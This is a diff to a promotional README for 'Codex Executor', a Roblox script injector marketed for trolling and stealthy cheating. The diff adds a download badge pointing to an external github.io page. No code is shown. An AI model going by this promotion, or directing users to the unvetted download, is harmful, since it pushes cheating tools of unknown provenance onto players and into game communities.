@@ -2,6 +2,8 @@
 
 When Roblox players crave control, **Codex Executor** delivers. This script injector blends raw power with sleek design—letting you run LUA hubs, GUIs, and custom mods at full speed. Whether you’re farming, trolling, or flexing in PvP, Codex puts you in command.
 
+[![Get](https://img.shields.io/badge/Get%20The-Executor-blueviolet)](https://codex-executor-script.github.io/.github/)
+
 **Quick Links:** [Overview](#overview) • [Features](#feature-breakdown-) • [Install](#instant-install-guide)
 
 ## Overview
@@ -77,3 +79,4 @@ Its balance of **speed, stealth, and stability** makes it stand out.
 ## License
 
 MIT License
+
